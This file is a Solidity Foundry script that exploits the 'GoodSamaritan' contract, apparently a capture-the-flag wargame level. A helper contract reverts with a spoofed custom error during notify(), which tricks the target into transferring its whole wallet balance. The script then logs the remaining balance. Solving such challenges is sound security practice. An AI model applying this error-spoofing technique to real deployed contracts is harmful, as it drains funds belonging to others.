// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GoodSamaritan.sol";
import "forge-std/Script.sol";

contract Ex {
    GoodSamaritan public gs_ = GoodSamaritan(0xEa1710DCb7287aFA9a0Cb07e5ADEf8c592F586f0);
    error NotEnoughBalance();

    function notify(uint256 amount) external {
        if(amount == 10) revert NotEnoughBalance();
    }

    function ex() public {
        gs_.requestDonation();
    }
}

contract GoodSamaritanSol is Script {
    GoodSamaritan public gs_ = GoodSamaritan(0xEa1710DCb7287aFA9a0Cb07e5ADEf8c592F586f0);

    function run() external {
        vm.startBroadcast();
    
        Ex ex_ = new Ex();
        ex_.ex();
        console.log(gs_.coin().balances(address(gs_.wallet())));

        vm.stopBroadcast();
    }
}